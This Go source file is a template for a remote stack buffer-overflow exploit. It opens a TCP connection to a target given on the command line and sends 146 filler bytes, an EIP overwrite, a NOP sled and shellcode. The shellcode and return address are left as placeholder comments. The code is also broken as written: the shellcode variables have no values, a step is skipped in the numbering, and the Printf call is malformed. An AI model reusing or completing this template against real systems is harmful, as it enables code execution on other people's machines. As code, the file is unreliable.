package main

import (
	"fmt"
	"net"
	"os"
	"strings"
)

func main() {
	ip := os.Args[1]
	port := os.Args[2]
	address := fmt.Sprintf("%s:%s", ip, port)
	conn, err := net.Dial("tcp", address)
		if err != nil {
			fmt.Printf("Connection failed", err.Error())
		}
		
	shellcode := //First line of shellcode
	shellcode += //Second line of shellcode
	shellcode += //Fourth line of shellcode
	//Put more shellcode as necessary
	 
	buff := strings.Repeat("A", 146) + /*Address of EIP*/ + strings.Repeat("\x90", 8) + shellcode + "\r\n"
		
	_, err = conn.Write([]byte(buff))
	if err != nil {
		panic("Connection failed while sending the exploit")
		os.Exit(1)
	}
	conn.Close()
}
